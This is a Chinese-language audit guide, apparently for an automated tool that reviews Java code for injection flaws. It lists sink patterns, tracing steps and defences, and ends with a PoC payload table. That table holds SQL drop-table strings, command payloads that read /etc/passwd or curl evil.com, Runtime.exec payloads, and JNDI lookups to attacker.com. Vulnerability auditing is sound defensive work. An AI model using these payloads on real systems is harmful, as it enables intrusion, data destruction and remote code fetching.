# Injection Family（SQL / NoSQL / Command / Code / LDAP / XPath / Template / SpEL / JNDI / JDBC URL Injection）

## 共性

所有 Injection 类漏洞的本质都是：**结构化语句的"语法层"和"数据层"被混淆**。
攻击者输入控制了 sink 的"指令字符串"而不仅是"数据值"，因此能改变指令含义。

## sink 模式速查（按 vuln_type 分组）

### SQL Injection
- `Statement.executeQuery($SQL)` / `executeUpdate($SQL, ...)` / `execute($SQL, ...)`
- `Connection.prepareStatement($SQL, ...)` —— **关键：$SQL 是字面量才安全；字符串拼接仍是 SQL Injection**
- `Connection.createStatement().executeXxx($SQL)`（链式调用，注意 `var connection` 推断失败）
- `JdbcTemplate.queryForXxx($SQL, ...)` / `query($SQL, ...)` / `update($SQL, ...)` / `execute($SQL, ...)`
- `EntityManager.createQuery($JPQL)` / `createNativeQuery($SQL)`
- `Session.createQuery($HQL)` / `createSQLQuery($SQL)` (Hibernate)
- `DSLContext.fetch($SQL)` / `execute($SQL)` (jOOQ)
- MyBatis `@Select("... ${param} ...")` / XML mapper `${param}`

### NoSQL Injection
- `MongoCollection.find(BasicDBObject.parse($JSON))`
- `db.eval($JS)` (MongoDB)

### Command Injection
- `Runtime.exec($CMD)` / `Runtime.exec(new String[]{...})`
- `new ProcessBuilder($CMD)` / `command($LIST)`
- `org.apache.commons.exec.DefaultExecutor.execute($CMD_LINE)`

### Code Injection
- `ScriptEngine.eval($SCRIPT)` (JS/Groovy/Python via JSR-223)
- `GroovyShell.evaluate($CODE)` / `parse($CODE).run()`
- `ognl.Ognl.getValue($EXPR, ...)` / `Struts2 OGNL` 表达式

### SpEL Injection
- `SpelExpressionParser.parseExpression($EXPR).getValue(...)`
- `@Value("#{...}")` 含用户输入

### JNDI Injection
- `InitialContext.lookup($URL)` / `ctx.lookup($NAME)`
- `LdapTemplate.lookup($DN)`

### XPath Injection
- `XPath.evaluate($EXPR, doc, ...)` / `XPath.compile($EXPR)`

### LDAP Injection
- `DirContext.search($BASE, $FILTER, ...)` 其中 $FILTER 拼接

### Template Injection
- `Velocity.evaluate(ctx, sw, ..., $TEMPLATE)` —— $TEMPLATE 含用户输入
- `freemarker.template.Template(name, $READER, cfg)` —— 用户控制模板内容

### JDBC URL Injection
- `DriverManager.getConnection($URL, ...)` —— $URL 含用户输入（可注入 `jdbc:h2:mem:;INIT=...` 等）

## 数据流追溯重点

1. **定位 sink 的"动态参数"**：sink 调用括号里的非字面量表达式（如 `$X`、`a + b`、`f()`）。
2. 对每个动态参数：
   - method 入参 → 找 controller 的 `@RequestParam` / `@PathVariable` / `@RequestBody` / `@RequestHeader`；
   - 局部变量 → method 内向上找赋值；递归同 1-2 步；
   - 字段访问 → 找类内 `@Value` 注入 / 构造函数赋值 / setter 来源。
3. 任一动态参数追溯到"用户可控且无有效过滤" → **VULNERABLE**。

⚠️ **多参数陷阱**（v12 baseline 实测 Assignment5 漏报）：
```java
if (!"Larry".equals(username)) return failed(...);   // username 被白名单
connection.prepareStatement("SELECT ... WHERE id='"+username+"' AND pwd='"+password+"'");
```
**仍是 SQL Injection** —— username 白名单 ≠ password 也安全，逐参数判定！

## 防御机制速查（搜这些即可见）

### SQL 类
- **`PreparedStatement.setXxx(idx, value)`** —— 参数化绑定（**前提：SQL 是字面量 + ? 占位**）
- `JdbcTemplate.queryForXxx(sql, Object[] args)` —— 第二参数是参数数组才安全
- MyBatis `#{param}`（参数绑定）而非 `${param}`（字符串拼接）
- 类型强转：`Integer.parseInt(input)` 后注入到 SQL（数字型可接受）
- ESAPI / OWASP `Encoder.encodeForSQL(codec, input)`

### Command 类
- 调用前严格白名单 / 正则校验 `if (!Pattern.matches("[a-zA-Z0-9_-]+", input)) throw ...`
- 避免 shell 元字符（直接传字符串数组 `new String[]{cmd, arg1, arg2}` 而非单字符串）
- 类型转换为枚举：`OperationType.valueOf(input.toUpperCase())`

### Code/SpEL/JNDI 类
- 完全禁用动态求值或限定到极严格白名单
- SpEL: `SimpleEvaluationContext.forReadOnlyDataBinding()` 而非默认 `StandardEvaluationContext`
- JNDI: `System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "false")` + JDK ≥ 8u191

## 常见误判（容易把 VULNERABLE 错判为 DEFENDED）

- ❌ 看到 `PreparedStatement` 类名就判 DEFENDED —— 关键看 SQL 字符串是字面量 + 用 `?` 占位
- ❌ 看到一个 if 校验就判 DEFENDED —— sink 里的其他参数可能仍可控
- ❌ "教学项目 / WebGoat" 借口 —— 一律按生产代码标准
- ❌ "用户必须登录" 借口 —— 已登录用户仍可触发注入
- ❌ "前端会校验" 借口 —— 前端校验不作数

## 证据引用范例

**DEFENDED 时**：
```
defense_analysis: "Line 42 PreparedStatement statement = conn.prepareStatement(
                   "SELECT * FROM users WHERE id = ?");
                  Line 43 statement.setInt(1, userId);
                  — SQL 是字面量 + ? 占位 + setInt 类型化绑定 userId,
                  不存在字符串拼接,符合 OWASP 推荐参数化模式。"
```

**VULNERABLE 时**：
```
suspicion_reason: "Line 44 prepareStatement(\"SELECT password FROM challenge_users
                   WHERE userid='\" + username + \"' and password='\" + password + \"'\")
                   — username 和 password 都来自 @RequestParam (line 32),
                   通过字符串拼接进入 SQL 语句,未使用 ? 占位 + setString 绑定."
```

## PoC 模板（VULNERABLE 时填 attack_vector / poc_payload）

| Injection 类型 | poc_payload 示例 |
|---|---|
| SQL Injection | `' OR '1'='1` / `' UNION SELECT user,pwd FROM users--` / `'; DROP TABLE x;--` |
| NoSQL Injection (MongoDB) | `{"$ne": null}` / `{"$where": "this.password.length > 0"}` |
| Command Injection | `; cat /etc/passwd` / `\` whoami\`` / `$(curl evil.com/x)` |
| Code Injection (OGNL) | `@java.lang.Runtime@getRuntime().exec("id")` |
| SpEL Injection | `T(java.lang.Runtime).getRuntime().exec("id")` |
| JNDI Injection | `ldap://attacker.com/Exploit` / `rmi://attacker.com/Exploit` |
| LDAP Injection | `*` / `*)(uid=*` |
| XPath Injection | `' or '1'='1` (同 SQL 思路) |
| JDBC URL Injection | `jdbc:h2:mem:;INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws ...'` |
| Template Injection (FreeMarker) | `<#assign x = 'freemarker.template.utility.Execute'?new()>${x("id")}` |
